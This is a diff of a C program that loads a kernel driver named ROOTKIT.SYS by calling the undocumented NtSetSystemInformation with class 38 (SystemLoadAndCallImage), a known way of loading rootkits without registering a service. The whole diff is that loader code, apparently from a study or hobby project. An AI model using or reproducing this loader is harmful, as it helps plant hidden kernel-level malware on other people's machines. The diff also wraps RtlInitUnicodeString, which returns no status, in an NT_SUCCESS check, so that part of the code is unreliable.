@@ -110,31 +110,36 @@ int main() {
     printf("\nFinish !\n");
     */
     SYSTEM_LOAD_AND_CALL_IMAGE GregsImage;
-    ZWSETSYSTEMINFORMATION ZwSetSystemInformation;
+    NTSETSYSTEMINFORMATION NtSetSystemInformation;
     RTLINITUNICODESTRING RtlInitUnicodeString;
+    SYSTEM_INFORMATION_CLASS test;
     int result;
-    WCHAR daPath[] = L"RootKitDriver.sys";
+    WCHAR daPath[] = L"\\??\\C:\\ROOTKIT.SYS";
 
     ////////////////////////////////////////////////////////////// 
     // get DLL entry points 
     ////////////////////////////////////////////////////////////// 
     if (!(RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress(ntdllBase, "RtlInitUnicodeString")))
     {
-        printf("RtlInitUnicodeString error !!! %p", RtlInitUnicodeString);
+        printf("RtlInitUnicodeString GetProcAddress error !!! %p", RtlInitUnicodeString);
         return false;
     }
 
-    if (!(ZwSetSystemInformation = (ZWSETSYSTEMINFORMATION)GetProcAddress(ntdllBase, "ZwSetSystemInformation"))){
-        printf("ZwSetSystemInformation error !!! %p", ZwSetSystemInformation);
+    if (!(NtSetSystemInformation = (NTSETSYSTEMINFORMATION)GetProcAddress(ntdllBase, "NtSetSystemInformation"))){
+        printf("NtSetSystemInformation GetProcAddress error !!! %p", NtSetSystemInformation);
         return false;
     }
 
-    RtlInitUnicodeString(&(GregsImage.ModuleName), daPath);
-    if (!NT_SUCCESS(result = ZwSetSystemInformation(38, &GregsImage, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE))))
+    if (!NT_SUCCESS(RtlInitUnicodeString(&(GregsImage.ModuleName), daPath))) {
+        printf("RtlInitUnicodeString error");
+        return false;
+    }
+
+    if (!NT_SUCCESS(result = NtSetSystemInformation(38, &GregsImage, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE))))
     {
-        printf("Loading error !!! %d", result);
+        printf("Loading error smhh !!! %x\n", result);
+        system("PAUSE");
         return false;
     }
-
     return true;
 }
